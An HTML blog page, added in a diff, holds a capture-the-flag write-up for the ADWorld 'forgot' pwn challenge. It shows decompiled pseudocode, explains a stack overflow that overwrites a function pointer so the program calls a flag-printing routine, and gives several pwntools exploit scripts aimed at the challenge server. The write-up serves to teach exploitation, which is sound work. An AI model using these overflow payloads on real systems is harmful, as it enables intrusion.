@@ -1,0 +1,199 @@
+
+<!DOCTYPE html>
+<html lang="default" class="loading">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>ADWorld PWN Challenge Area Write-up (forgot) - TyeYeah&#39;s blog</title>
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate">
+    <meta name="keywords" content="TyeYeah, CS,"> 
+    <meta name="description" content="blog on Hexo,This challenge needs to read carefully and be patient.
+forgotAttachment: forgotDescription: Fawkes ,"> 
+    <meta name="author" content="TyeYeah"> 
+    <link rel="alternative" href="atom.xml" title="TyeYeah&#39;s blog" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    <link rel="stylesheet" href="/css/diaspora.css">
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads" src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+</head>
+</html>
+<body class="loading">
+    <span id="config-title" style="display:none">TyeYeah&#39;s blog</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://yoursite.com"></a>
+    <div title="Play/Stop" class="iconfont icon-play"></div>
+    <h3 class="subtitle">ADWorld PWN Challenge Area Write-up (forgot)</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="QR Code" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class="main">
+        <h1 class="title">ADWorld PWN Challenge Area Write-up (forgot)</h1>
+        <div class="stuff">
+            <span>August 01, 2020</span>
+            
+  <ul class="post-tags-list"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/buffer-overflow/">buffer overflow</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/linux/">linux</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/pwn/">pwn</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/rop/">rop</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/stack-overflow/">stack overflow</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <p>This challenge needs to read carefully and be patient.</p>
+<h2 id="forgot"><a href="#forgot" class="headerlink" title="forgot"></a>forgot</h2><p>Attachment: <a href="/filehost/apcaw/forgot">forgot</a><br>Description: Fawkes has been playing around with Finite State Automaton lately. While exploring the concept of implementing regular expressions using FSA he thought of implementing an email-address validator.<br>Recently, Lua started to annoy Fawkes. To this, Fawkes, challenged Lua to a battle of wits. Fawkes promised to reward Lua, only if she manages to transition to a non-reachable state in the FSA he implemented. The replication can be accessed here.</p>
+<h2 id="Information"><a href="#Information" class="headerlink" title="Information"></a>Information</h2><p>Check:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ file forgot</span><br><span class="line">forgot: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=35930a2d9b048236694e9611073b759e1c88b8c4, stripped</span><br><span class="line">$ checksec forgot</span><br><span class="line">[*] &apos;/root/forgot&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure></p>
+<p>Pseudocode:<br><code>main</code>:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v0; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">char</span> v2[<span class="number">32</span>]; <span class="comment">// [esp+10h] [ebp-74h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v3)(); <span class="comment">// [esp+30h] [ebp-54h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v4)(); <span class="comment">// [esp+34h] [ebp-50h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v5)(); <span class="comment">// [esp+38h] [ebp-4Ch]</span></span><br><span class="line">  <span class="keyword">int</span> (*v6)(); <span class="comment">// [esp+3Ch] [ebp-48h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v7)(); <span class="comment">// [esp+40h] [ebp-44h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v8)(); <span class="comment">// [esp+44h] [ebp-40h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v9)(); <span class="comment">// [esp+48h] [ebp-3Ch]</span></span><br><span class="line">  <span class="keyword">int</span> (*v10)(); <span class="comment">// [esp+4Ch] [ebp-38h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v11)(); <span class="comment">// [esp+50h] [ebp-34h]</span></span><br><span class="line">  <span class="keyword">int</span> (*v12)(); <span class="comment">// [esp+54h] [ebp-30h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+58h] [ebp-2Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// [esp+78h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">size_t</span> i; <span class="comment">// [esp+7Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v14 = <span class="number">1</span>;</span><br><span class="line">  v3 = sub_8048604;</span><br><span class="line">  v4 = sub_8048618;</span><br><span class="line">  v5 = sub_804862C;</span><br><span class="line">  v6 = sub_8048640;</span><br><span class="line">  v7 = sub_8048654;</span><br><span class="line">  v8 = sub_8048668;</span><br><span class="line">  v9 = sub_804867C;</span><br><span class="line">  v10 = sub_8048690;</span><br><span class="line">  v11 = sub_80486A4;</span><br><span class="line">  v12 = sub_80486B8;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"What is your name?"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">32</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  sub_80485DD((<span class="keyword">int</span>)&amp;s);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"I should give you a pointer perhaps. Here: %x\n\n"</span>, sub_8048654);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Enter the string to be validate"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%s"</span>, v2);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = i;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &gt;= <span class="built_in">strlen</span>(v2) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">switch</span> ( v14 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> ( sub_8048702(v2[i]) )</span><br><span class="line">          v14 = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v2[i] == <span class="number">64</span> )</span><br><span class="line">          v14 = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> ( sub_804874C(v2[i]) )</span><br><span class="line">          v14 = <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v2[i] == <span class="number">46</span> )</span><br><span class="line">          v14 = <span class="number">5</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">if</span> ( sub_8048784(v2[i]) )</span><br><span class="line">          v14 = <span class="number">6</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        <span class="keyword">if</span> ( sub_8048784(v2[i]) )</span><br><span class="line">          v14 = <span class="number">7</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">if</span> ( sub_8048784(v2[i]) )</span><br><span class="line">          v14 = <span class="number">8</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">if</span> ( sub_8048784(v2[i]) )</span><br><span class="line">          v14 = <span class="number">9</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">        v14 = <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  (*(&amp;v3 + --v14))();</span><br><span class="line">  <span class="keyword">return</span> fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p><code>sub_8048702</code> (similar to <code>sub_804874C</code> and <code>sub_8048784</code>):<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_BOOL4 __<span class="function">cdecl <span class="title">sub_8048702</span><span class="params">(<span class="keyword">char</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> a1 &gt; <span class="number">96</span> &amp;&amp; a1 &lt;= <span class="number">122</span> || a1 &gt; <span class="number">47</span> &amp;&amp; a1 &lt;= <span class="number">57</span> || a1 == <span class="number">95</span> || a1 == <span class="number">45</span> || a1 == <span class="number">43</span> || a1 == <span class="number">46</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p><code>sub_80486CC</code>:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_80486CC</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Eh] [ebp-3Ah]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">snprintf</span>(&amp;s, <span class="number">0x32</span>u, <span class="string">"cat %s"</span>, <span class="string">"./flag"</span>);</span><br><span class="line">  <span class="keyword">return</span> system(&amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>Other functions are all about outputting strings.</p>
+<h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>The whole routine of this program is to validate your mail address: first input your name string, then input the mail address to validate.</p>
+<p>Our name will be saved in <code>s</code>, and our mail address will be saved on <code>v2</code>, while the magic function <code>sub_80486CC</code> empower us to <code>cat the flag</code>.<br>Remember <code>(*(&amp;v3 + --v14))();</code> at the tail of <code>main()</code>? It executes what <code>&amp;v3 + --v14</code> points to, so <code>v3</code> is clearly where we should overflow.</p>
+<pre><code>char v2[32]; // [esp+10h] [ebp-74h]
+int (*v3)(); // [esp+30h] [ebp-54h]
+</code></pre><p>Vulnerability appears at <code>__isoc99_scanf(&quot;%s&quot;, v2);</code>, and the offset is easy to confirm, right? No no no, what exactly <code>&amp;v3 + --v14</code> means?<br>The <code>switch ... case</code> statements is long but easy to understand, so if we dont let <code>sub_8048702</code> and other conditions be true, <code>v14</code> will always be <code>1</code>, and <code>&amp;v3 + --v14</code> will always be <code>&amp;3</code>.</p>
+<p>How to get <code>sub_8048702</code> false? After looking up the <code>ASCII</code> table, we can see all the uppercase letters are ok.</p>
+<p>Eventually we get our exploit</p>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'i386'</span>)</span><br><span class="line">sh = process(<span class="string">'forgot'</span>)</span><br><span class="line">sh = remote(<span class="string">'220.249.52.133'</span>,<span class="number">43897</span>)</span><br><span class="line">shelf = ELF(<span class="string">'forgot'</span>)</span><br><span class="line"></span><br><span class="line">cat_flag_addr = <span class="number">0x80486CC</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> sh.recv() <span class="comment"># What is your name?</span></span><br><span class="line">sh.sendline(<span class="string">'name'</span>)</span><br><span class="line"><span class="keyword">print</span> sh.recv() <span class="comment"># Enter the string to be validate</span></span><br><span class="line">sh.sendline(<span class="string">'A'</span>*<span class="number">0x20</span> + p32(cat_flag_addr))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<p>Another payload is also ok:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">"a"</span> * <span class="number">32</span> + <span class="string">"a"</span> * <span class="number">4</span> +  p32(flag_addr)</span><br></pre></td></tr></table></figure></p>
+<p>A more concise payload is:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'i386'</span>, os = <span class="string">'linux'</span>)</span><br><span class="line">r = remote(<span class="string">'220.249.52.133'</span>,<span class="number">43897</span>)</span><br><span class="line">overflow = <span class="string">"A"</span>*<span class="number">63</span></span><br><span class="line">addr = <span class="number">0x080486cc</span></span><br><span class="line">overflow += p32(addr)</span><br><span class="line">r.send(overflow + <span class="string">"\n"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Enter the string to be validate"</span>)</span><br><span class="line">flag = r.recv()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*] Flag: "</span> + flag</span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure></p>
+<p>Here is 63 because it inputs from <code>name</code> part, and it only receive 32 bytes but including 1 <code>\x00</code>, so still 32 left for <code>v2</code> part.</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src>
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title="0" data-url="https://link.hhtjim.com/163/514216257.mp3"></li>
+                        
+                    
+                        
+                            <li title="1" data-url="https://link.hhtjim.com/163/514213582.mp3"></li>
+                        
+                    
+                        
+                            <li title="2" data-url="https://link.hhtjim.com/163/514216237.mp3"></li>
+                        
+                    
+                        
+                            <li title="3" data-url="https://link.hhtjim.com/163/36664350.mp3"></li>
+                        
+                    
+                        
+                            <li title="4" data-url="https://link.hhtjim.com/163/401722197.mp3"></li>
+                        
+                    
+                        
+                            <li title="5" data-url="https://link.hhtjim.com/163/34228815.mp3"></li>
+                        
+                    
+                        
+                            <li title="6" data-url="https://link.hhtjim.com/163/401723178.mp3"></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id="gitalk-container" class="comment link" data-enable="false" data-ae="false" data-ci data-cs data-r data-o data-a data-d="false">View Comments</div>
+
+
+    </div>
+    
+        <div class="side">
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#forgot"><span class="toc-number">1.</span> <span class="toc-text">forgot</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Information"><span class="toc-number">2.</span> <span class="toc-text">Information</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis"><span class="toc-number">3.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">4.</span> <span class="toc-text">Exploit</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
